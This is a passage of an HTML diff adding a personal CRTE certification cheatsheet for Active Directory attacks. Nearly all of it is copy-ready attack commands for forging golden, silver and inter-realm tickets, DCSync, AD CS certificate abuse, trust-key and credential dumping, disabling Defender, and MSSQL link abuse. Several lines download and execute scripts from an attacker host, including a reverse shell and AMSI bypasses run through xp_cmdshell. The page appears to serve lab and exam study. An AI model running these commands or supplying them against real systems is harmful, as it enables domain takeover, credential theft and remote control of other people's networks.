+
+<span class="comment"># S4U to get CIFS access (file system)</span>
+Rubeus.exe s4u /user:&lt;MACHINE&gt;$ /aes256:&lt;AES256_HASH&gt; /msdsspn:cifs/&lt;TARGET&gt; /impersonateuser:administrator /ptt
+
+<span class="comment"># Copy loader and dump credentials</span>
+echo F | xcopy Loader.exe \\&lt;TARGET&gt;\C$\Users\Public\Loader.exe /Y
+winrs -r:&lt;TARGET&gt; cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=&lt;ATTACKER_IP&gt;
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe</pre></div>
+    </div>
+</div>
+
+<!-- 11 TICKETS -->
+<div class="section-block reveal" id="tickets">
+    <div class="section-number">// 11</div>
+    <h2>Golden &amp; Silver <span class="accent">Tickets</span></h2>
+
+    <h3>Golden Ticket</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD - BetterSafetyKatz</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /aes256:&lt;KRBTGT_AES256&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+klist</pre></div>
+    </div>
+
+    <h3>Golden Ticket with Invoke-Mimi</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>. .\Invoke-Mimi.ps1
+
+Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /aes256:&lt;KRBTGT_AES256&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+$sess = New-PSSession &lt;TARGET&gt;
+Enter-PSSession -Session $sess
+<span class="comment"># Bypass AMSI, then:</span>
+Invoke-Command -FilePath Invoke-Mimi.ps1 -Session $sess
+Enter-PSSession -Session $sess
+Invoke-Mimi -Command '"lsadump::lsa /patch"'</pre></div>
+    </div>
+
+    <h3>Silver Ticket</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /target:&lt;TARGET_SERVER&gt; /service:HOST /aes256:&lt;SERVICE_AES256&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+klist</pre></div>
+    </div>
+</div>
+
+<!-- 12 DCSYNC -->
+<div class="section-block reveal" id="dcsync">
+    <div class="section-number">// 12</div>
+    <h2><span class="accent">DCSync</span></h2>
+
+    <h3>Check Replication Rights</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-DomainObjectAcl -SearchBase "dc=&lt;DOMAIN&gt;,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "&lt;USER&gt;"}</pre></div>
+    </div>
+
+    <h3>Add DCSync Rights (Requires DA)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># PowerView</span>
+Add-DomainObjectAcl -TargetIdentity "dc=&lt;DOMAIN&gt;,dc=local" -PrincipalIdentity &lt;USER&gt; -Rights DCSync -PrincipalDomain &lt;DOMAIN&gt; -TargetDomain &lt;DOMAIN&gt; -Verbose
+
+<span class="comment"># AD Module with RACE toolkit</span>
+Set-ADACL -DistinguishedName 'DC=&lt;DOMAIN&gt;,DC=local' -SamAccountName &lt;USER&gt; -GUIDRight DCSync -Verbose</pre></div>
+    </div>
+
+    <h3>Execute DCSync</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>SafetyKatz.exe "lsadump::dcsync /user:&lt;DOMAIN&gt;\krbtgt" "exit"
+
+<span class="comment"># Or with Invoke-Mimi</span>
+Invoke-Mimi -Command '"lsadump::dcsync /user:&lt;DOMAIN&gt;\krbtgt"'</pre></div>
+    </div>
+</div>
+
+<!-- 13 AD CS -->
+<div class="section-block reveal" id="adcs">
+    <div class="section-number">// 13</div>
+    <h2>AD CS - <span class="accent">Certificates</span></h2>
+
+    <h3>Enumerate Certificate Authorities</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Certify.exe cas
+Certify.exe find
+Certify.exe find /enrolleeSuppliesSubject</pre></div>
+    </div>
+
+    <div class="note">ENROLLEE_SUPPLIES_SUBJECT means you can request a certificate for ANY user.</div>
+
+    <h3>Request Certificate as Another User (ESC1)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Request cert as Administrator</span>
+Certify.exe request /ca:&lt;CA_SERVER&gt;\&lt;CA_NAME&gt; /template:&lt;VULNERABLE_TEMPLATE&gt; /altname:Administrator
+
+<span class="comment"># Save output between BEGIN RSA PRIVATE KEY and END CERTIFICATE as cert.pem</span>
+<span class="comment"># Convert to PFX</span>
+openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out DA.pfx
+
+<span class="comment"># Request TGT as DA</span>
+Rubeus.exe asktgt /user:Administrator /certificate:DA.pfx /password:&lt;PFX_PASSWORD&gt; /nowrap /ptt
+
+winrs -r:&lt;DC&gt; whoami</pre></div>
+    </div>
+
+    <h3>Escalate to Enterprise Admin</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Request and convert cert for EA, then:</span>
+Rubeus.exe asktgt /user:&lt;PARENT_DOMAIN&gt;\Administrator /dc:&lt;PARENT_DC&gt; /certificate:EA.pfx /password:&lt;PFX_PASSWORD&gt; /nowrap /ptt
+
+winrs -r:&lt;PARENT_DC&gt; whoami</pre></div>
+    </div>
+</div>
+
+<!-- 14 AZURE AD CONNECT -->
+<div class="section-block reveal" id="azuread">
+    <div class="section-number">// 14</div>
+    <h2>Azure AD <span class="accent">Connect</span></h2>
+
+    <h3>Find MSOL Account</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server &lt;DOMAIN&gt; -Properties * | select SamAccountName,Description | fl</pre></div>
+    </div>
+
+    <h3>Extract MSOL Credentials</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Get access to the AD Connect server</span>
+Rubeus.exe asktgt /domain:&lt;DOMAIN&gt; /user:&lt;USER&gt; /aes256:&lt;AES256_HASH&gt; /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+<span class="comment"># Copy InviShell to target</span>
+echo F | xcopy InShellProf.dll \\&lt;ADCONNECT_SERVER&gt;\C$\Users\&lt;USER&gt;\Downloads\InShellProf.dll /Y
+echo F | xcopy RunWithRegistryNonAdmin.bat \\&lt;ADCONNECT_SERVER&gt;\C$\Users\&lt;USER&gt;\Downloads\RunWithRegistryNonAdmin.bat /Y
+
+<span class="comment"># Access and extract</span>
+winrs -r:&lt;ADCONNECT_SERVER&gt; cmd
+RunWithRegistryNonAdmin.bat
+
+iex (New-Object Net.WebClient).DownloadString('http://&lt;ATTACKER_IP&gt;/adconnect.ps1')
+ADconnect</pre></div>
+    </div>
+
+    <h3>DCSync with MSOL Account</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>runas /user:&lt;DOMAIN&gt;\&lt;MSOL_ACCOUNT&gt; /netonly cmd
+
+SafetyKatz.exe "lsadump::dcsync /user:&lt;DOMAIN&gt;\administrator /domain:&lt;DOMAIN&gt;" "exit"</pre></div>
+    </div>
+</div>
+
+<!-- 15 DOMAIN PRIVESC -->
+<div class="section-block reveal" id="domainprivesc">
+    <div class="section-number">// 15</div>
+    <h2>Domain Privesc - <span class="accent">Trust Key &amp; KRBTGT</span></h2>
+
+    <h3>Extract Trust Key</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Access DC with DA privileges</span>
+Rubeus.exe asktgt /user:administrator /aes256:&lt;AES256_HASH&gt; /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+<span class="comment"># Copy loader and dump trust keys</span>
+echo F | xcopy Loader.exe \\&lt;DC&gt;\C$\Users\Public\Loader.exe /Y
+winrs -r:&lt;DC&gt; cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=&lt;ATTACKER_IP&gt;
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+
+lsadump::trust /patch
+<span class="comment"># Grab RC4 of child domain -&gt; parent domain trust</span></pre></div>
+    </div>
+
+    <h3>Inter-Realm TGT with Trust Key</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>BetterSafetyKatz.exe "kerberos::golden /domain:&lt;CHILD_DOMAIN&gt; /sid:&lt;CHILD_SID&gt; /sids:&lt;PARENT_SID&gt;-519 /rc4:&lt;TRUST_RC4&gt; /user:Administrator /service:krbtgt /target:&lt;PARENT_DOMAIN&gt; /ticket:trust_tkt.kirbi" "exit"
+
+Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:CIFS/&lt;PARENT_DC&gt; /dc:&lt;PARENT_DC&gt; /ptt
+
+klist
+dir \\&lt;PARENT_DC&gt;\c$</pre></div>
+    </div>
+
+    <h3>Using KRBTGT Hash (SID History)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:&lt;CHILD_DOMAIN&gt; /sid:&lt;CHILD_SID&gt; /krbtgt:&lt;KRBTGT_HASH&gt; /sids:&lt;PARENT_SID&gt;-519 /ptt" "exit"
+
+klist
+winrs -r:&lt;PARENT_DC&gt; cmd</pre></div>
+    </div>
+</div>
+
+<!-- 16 FOREST TRUST -->
+<div class="section-block reveal" id="foresttrust">
+    <div class="section-number">// 16</div>
+    <h2>Forest <span class="accent">Trust Abuse</span></h2>
+
+    <h3>Forge Inter-Realm TGT</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /rc4:&lt;TRUST_RC4&gt; /service:krbtgt /target:&lt;FOREIGN_DOMAIN&gt; /sids:&lt;FOREIGN_EA_SID&gt;-519 /ticket:cross_forest.kirbi" "exit"
+
+Rubeus.exe asktgs /ticket:cross_forest.kirbi /service:CIFS/&lt;FOREIGN_DC&gt; /dc:&lt;FOREIGN_DC&gt; /ptt
+
+dir \\&lt;FOREIGN_DC&gt;\&lt;SHARE_NAME&gt;</pre></div>
+    </div>
+
+    <h3>SID History Injection (Cross-Forest)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check for groups with SID &gt; 1000</span>
+Get-ADGroup -Filter 'SID -ge "S-1-5-21-&lt;FOREIGN_DOMAIN_ID&gt;-1000"' -Server &lt;FOREIGN_DOMAIN&gt;</pre></div>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Create ticket with SIDHistory of target group</span>
+BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /rc4:&lt;TRUST_RC4&gt; /service:krbtgt /target:&lt;FOREIGN_DOMAIN&gt; /sids:&lt;TARGET_GROUP_SID&gt; /ticket:sidhistory.kirbi" "exit"
+
+<span class="comment"># Request TGS for HTTP (PSRemoting)</span>
+Rubeus.exe asktgs /ticket:sidhistory.kirbi /service:HTTP/&lt;FOREIGN_SERVER&gt; /dc:&lt;FOREIGN_DC&gt; /ptt
+
+winrs -r:&lt;FOREIGN_SERVER&gt; cmd</pre></div>
+    </div>
+</div>
+
+<!-- 17 MSSQL -->
+<div class="section-block reveal" id="mssql">
+    <div class="section-number">// 17</div>
+    <h2><span class="accent">MSSQL</span> Abuse</h2>
+
+    <h3>Enumerate SQL Links</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell - PowerUpSQL</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Import-Module PowerupSQL.psd1
+
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+Get-SQLServerLink -Instance &lt;SQL_SERVER&gt; -Verbose
+Get-SQLServerLinkCrawl -Instance &lt;SQL_SERVER&gt; -Verbose
+
+<span class="comment"># Execute commands through links</span>
+Get-SQLServerLinkCrawl -Instance &lt;SQL_SERVER&gt; -Query 'exec master..xp_cmdshell ''whoami'''</pre></div>
+    </div>
+
+    <h3>Reverse Shell via SQL Links</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Start listener</span>
+. .\powercat.ps1
+powercat -l -v -p 443 -t 1000
+
+<span class="comment"># Trigger reverse shell through SQL link</span>
+Get-SQLServerLinkCrawl -Instance &lt;SQL_SERVER&gt; -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://&lt;ATTACKER_IP&gt;/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://&lt;ATTACKER_IP&gt;/amsibypass.txt);iex (iwr -UseBasicParsing http://&lt;ATTACKER_IP&gt;/Invoke-PowerShellTcpEx.ps1)"'''</pre></div>
+    </div>
+
+    <h3>Enable RPC Out &amp; xp_cmdshell (SA Required)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Invoke-SqlCmd -Query "exec sp_serveroption @server='&lt;LINKED_SERVER&gt;', @optname='rpc', @optvalue='TRUE'"
+Invoke-SqlCmd -Query "exec sp_serveroption @server='&lt;LINKED_SERVER&gt;', @optname='rpc out', @optvalue='TRUE'"
+Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""&lt;LINKED_SERVER&gt;"""
+Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""&lt;LINKED_SERVER&gt;"""
+
+<span class="comment"># Execute on specific target in the link chain</span>
+Get-SQLServerLinkCrawl -Instance &lt;SQL_SERVER&gt; -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget &lt;LINKED_SERVER&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 18 FSP -->
+<div class="section-block reveal" id="fsp">
+    <div class="section-number">// 18</div>
+    <h2>Foreign Security <span class="accent">Principals</span></h2>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerate trust relationships</span>
+Get-ForestTrust
+<span class="comment"># Look for: TrustType = Forest, TrustDirection = Bidirectional</span>
+
+<span class="comment"># Find interesting ACLs in foreign domain</span>
+Find-InterestingDomainAcl -ResolveGUIDs -Domain &lt;FOREIGN_DOMAIN&gt;
+<span class="comment"># Look for: GenericAll over an ObjectDN</span>
+
+<span class="comment"># If you have GenericAll, reset the password</span>
+Set-DomainUserPassword -Identity &lt;TARGET_USER&gt; -AccountPassword (ConvertTo-SecureString '&lt;NEW_PASSWORD&gt;' -AsPlainText -Force) -Domain &lt;FOREIGN_DOMAIN&gt; -Verbose
+
+<span class="comment"># Enumerate FSPs</span>
+Find-ForeignGroup -Verbose
+
+<span class="comment"># Identify the user behind the SID</span>
+Get-DomainUser -Domain &lt;FOREIGN_DOMAIN&gt; | ?{$_.ObjectSid -eq '&lt;FSP_SID&gt;'}</pre></div>
+    </div>
+
+    <h3>Access Foreign Domain</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># WinRS</span>
+winrs -r:&lt;FOREIGN_DC&gt; -u:&lt;FOREIGN_DOMAIN&gt;\&lt;USER&gt; -p:&lt;PASSWORD&gt; "whoami"
+
+<span class="comment"># PSRemoting</span>
+$passwd = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("&lt;FOREIGN_DOMAIN&gt;\&lt;USER&gt;", $passwd)
+$session = New-PSSession -Computername &lt;FOREIGN_DC&gt; -Credential $creds
+Invoke-Command -scriptblock{whoami;hostname} -Session $session</pre></div>
+    </div>
+</div>
+
+<!-- 19 PAM TRUST -->
+<div class="section-block reveal" id="pam">
+    <div class="section-number">// 19</div>
+    <h2><span class="accent">PAM</span> Trust</h2>
+
+    <h3>Enumerate Foreign Security Principals</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server &lt;DOMAIN&gt;
+
+<span class="comment"># Find which DA group the FSP belongs to</span>
+Get-ADGroup -Filter * -Properties Member -Server &lt;DOMAIN&gt; | ?{$_.Member -match '&lt;FSP_SID&gt;'}</pre></div>
+    </div>
+
+    <h3>Check PAM Trust</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
+<span class="comment"># Look for: ForestTransitive = True, SIDFilteringForestAware = False</span></pre></div>
+    </div>
+
+    <h3>Check Shadow Principals</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name, member, msDS-ShadowPrincipalSid | fl</pre></div>
+    </div>
+
+    <h3>Access via PAM Trust</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Get DA access and enumerate further forests</span>
+Rubeus.exe asktgt /domain:&lt;DOMAIN&gt; /user:administrator /aes256:&lt;AES256_HASH&gt; /dc:&lt;DC&gt; /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+<span class="comment"># Check PAM in further forests</span>
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server &lt;TARGET_FOREST&gt;
+<span class="comment"># Look for: SIDFilteringForestAware = True</span>
+
+<span class="comment"># Get target forest IP</span>
+Get-DnsServerZone -ZoneName &lt;TARGET_FOREST&gt; | fl *
+
+<span class="comment"># Modify TrustedHosts (elevated shell required)</span>
+Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
+
+<span class="comment"># Access via PSRemoting</span>
+SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:&lt;DOMAIN&gt; /ntlm:&lt;NTLM_HASH&gt; /run:powershell.exe" "exit"
+Enter-PSSession &lt;TARGET_IP&gt; -Authentication NegotiateWithImplicitCredential</pre></div>
+    </div>
+</div>
+
+<!-- 20 RECURRING -->
+<div class="section-block reveal" id="recurring">
+    <div class="section-number">// 20</div>
+    <h2>Recurring <span class="accent">Commands</span></h2>
+
+    <h3>BloodHound Collection</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>SharpHound.exe --CollectionMethods All</pre></div>
+    </div>
+
+    <h3>Module Imports</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># InviShell (bypass)</span>
+RunWithRegistryNonAdmin.bat
+
+<span class="comment"># AD Module</span>
+Import-Module Microsoft.ActiveDirectory.Management.dll
+Import-Module ActiveDirectory.psd1
+
+<span class="comment"># PowerView</span>
+. .\PowerView.ps1
+
+<span class="comment"># Invoke-Mimi</span>
+. .\Invoke-Mimi.ps1</pre></div>
+    </div>
+
+    <h3>Common Access Methods</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># WinRS</span>
+winrs -r:&lt;TARGET&gt; cmd
+winrs -r:&lt;TARGET&gt; -u:.\administrator -p:&lt;PASSWORD&gt; cmd
+
+<span class="comment"># PSSession</span>
+$passwd = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("&lt;DOMAIN&gt;\&lt;USER&gt;", $passwd)
+$session = New-PSSession -ComputerName &lt;TARGET&gt; -Credential $creds
+
+<span class="comment"># Copy files</span>
+echo F | xcopy Loader.exe \\&lt;TARGET&gt;\C$\Users\Public\Loader.exe /Y
+
+<span class="comment"># Port forwarding</span>
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=&lt;ATTACKER_IP&gt;
+
+<span class="comment"># Download from attacker</span>
+iex (New-Object Net.WebClient).DownloadString('http://&lt;ATTACKER_IP&gt;/&lt;SCRIPT&gt;.ps1')</pre></div>
+    </div>
+
+    <h3>Find Remote Access</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>. .\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Domain &lt;DOMAIN&gt; -Verbose</pre></div>
+    </div>
+
+    <h3>Get Domain SID</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-DomainSID
+Get-DomainSID -Domain &lt;TARGET_DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>AMSI Bypass</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Use obfuscated AMSI bypass before running any PowerShell tools</span>
+<span class="comment"># Multiple techniques available - use the one that works in your environment</span></pre></div>
+    </div>
+
+    <h3>Disable AV (If Admin)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre></div>
+    </div>
+
+    <h3>Runas with Network Credentials</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>runas /user:&lt;DOMAIN&gt;\&lt;USER&gt; /netonly cmd</pre></div>
+    </div>
+
+    <h3>DCSync</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>SafetyKatz.exe "lsadump::dcsync /user:&lt;DOMAIN&gt;\administrator /domain:&lt;DOMAIN&gt;" "exit"</pre></div>
+    </div>
+
+    <h3>Enumerate Resources</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>dir \\&lt;DC&gt;\c$</pre></div>
+    </div>
+</div>
+
+</main>
+</div>
+
+<!-- Back to top -->
+<a href="#" class="back-top" id="backTop">&uarr;</a>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-inner">
+        <a href="/" class="footer-brand">GUARINA0x0</a>
+        <span class="footer-sep">&bull;</span>
+        <span>CRTE Cheatsheet</span>
+        <span class="footer-sep">&bull;</span>
+        <span>&copy; 2026</span>
+        <span class="footer-sep">&bull;</span>
+        <div class="footer-social">
+            <a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+            </a>
+            <a href="https://www.linkedin.com/in/antonio-gallego-l%C3%B3pez-14047b1bb/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            </a>
+            <a href="https://x.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="X (Twitter)">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            </a>
+        </div>
+    </div>
+    <p class="footer-dimension">Transmitiendo desde la Dimensi&oacute;n C-137</p>
+</footer>
+
+<!-- Search Modal -->
+<div class="search-overlay" id="searchOverlay">
+    <div class="search-modal">
+        <div class="search-input-wrap">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <input type="text" class="search-input" id="searchInput" placeholder="Search commands..." autocomplete="off" spellcheck="false" aria-label="Buscar comandos">
+            <span class="search-result-count" id="searchCount"></span>
+            <span class="search-close-hint">ESC</span>
+        </div>
+        <div class="search-filters" id="searchFilters">
+            <div class="filter-row">
+                <button class="filter-chip active" data-sheet="all">All</button>
+                <button class="filter-chip" data-sheet="CRTE">CRTE</button>
+                <button class="filter-chip" data-sheet="CRTO">CRTO</button>
+                <button class="filter-chip" data-sheet="CWP">CWP</button>
+                <button class="filter-chip" data-sheet="CARTP">CARTP</button>
+            </div>
+            <div class="filter-row">
+                <button class="filter-chip lang active" data-lang="all">All Langs</button>
+                <button class="filter-chip lang" data-lang="PowerShell">PowerShell</button>
+                <button class="filter-chip lang" data-lang="Bash">Bash</button>
+                <button class="filter-chip lang" data-lang="CMD">CMD</button>
+                <button class="filter-chip lang" data-lang="Cobalt Strike">Cobalt Strike</button>
+            </div>
